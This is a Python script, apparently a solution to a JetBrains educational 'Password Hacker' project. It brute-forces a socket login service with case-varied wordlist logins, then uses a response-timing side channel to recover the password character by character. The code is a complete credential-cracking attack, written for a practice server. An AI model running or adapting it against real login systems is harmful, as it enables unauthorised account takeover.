""" Password Hacker is a graduate project of JetBrains.
Stages:
1. Establishing connection though sockets
2. Simple brute force
3. Dictionary brute force
4. Catching exception
5. Time-based vulnerability
"""


import argparse
import socket
import string
import itertools
import json
import time


def code_number_in_bit_array(_num, _len):
    result_list = []
    residue = _num
    for i in range(_len):
        result_list.append(0)

    for i in range(_len):

        if residue // 2 ** (_len - i - 1) == 1:
            residue -= 2 ** (_len - i - 1)
            result_list[i] = 1
        else:
            result_list[i] = 0

    return result_list[::-1]


def combinate_Low_Up(word):
    count = 0
    result_word = list(word)
    used_set = set()
    while count < 2 ** len(word):
        bit_array = code_number_in_bit_array(count, len(word))
        for i in range(len(word)):
            if bit_array[i] == 1:
                result_word[i] = result_word[i].upper()
            else:
                result_word[i] = result_word[i].lower()
        if ''.join(result_word) not in used_set:
            used_set.add(''.join(result_word))
            yield ''.join(result_word)
        count += 1


def generate_log():
    """this function generate password with number_tries
    by combinating the list of letters and numbers from the file 'logins.txt'"""
    with open('logins.txt', 'r', encoding="utf-8") as f:
        list_pass = list(f)
        for i in range(len(list_pass)):
            list_pass[i] = list_pass[i].rstrip('\n')

        for line in list_pass:
            my_call = combinate_Low_Up(line)
            res = next(my_call, -1)
            while res != -1:
                yield res
                res = next(my_call, -1)
        yield "-1"


def next_letter(word):
    """ This function add one letter to word
    for implementation brute force
    """
    str_symbols = string.ascii_uppercase + string.ascii_lowercase + string.digits
    for x in str_symbols:
        yield word + x

invoke_generate_log = generate_log()

#  parsing input arguments
input_parser = argparse.ArgumentParser()
input_parser.add_argument('IP', help="IP address to connect")
input_parser.add_argument('port', help="port to connect")
args = input_parser.parse_args()

#  connect to server through socket
hostname = args.IP
port = int(args.port)
address = (hostname, port)
dict_login_pass = {"login": "", "password": " "}
dict_result = {"result": ""}    # saves the response from the server


with socket.socket() as client_socket:  # content manager
    client_socket.connect(address)

    while dict_result["result"] != "Wrong password!":   # Cycle of finding right login
        dict_login_pass["login"] = next(invoke_generate_log)
        log_pass = json.dumps(dict_login_pass, indent=1)
        client_socket.sendall(log_pass.encode())
        response = client_socket.recv(1024)
        dict_result = json.loads(response.decode())

    dict_login_pass["password"] = ""
    next_letter_call = next_letter(dict_login_pass["password"])

    while dict_result["result"] != "Connection success!":   # Cycle of finding right password
        dict_login_pass["password"] = next(next_letter_call)
        log_pass = json.dumps(dict_login_pass, indent=1)

        start = time.perf_counter()
        client_socket.sendall(log_pass.encode())
        response = client_socket.recv(1024)
        end = time.perf_counter()
        total_time = end - start
        dict_result = json.loads(response.decode())

        if (end - start) >= 0.05:
            next_letter_call = next_letter(dict_login_pass["password"])



print(json.dumps(dict_login_pass, indent=1))    # hacked password and login

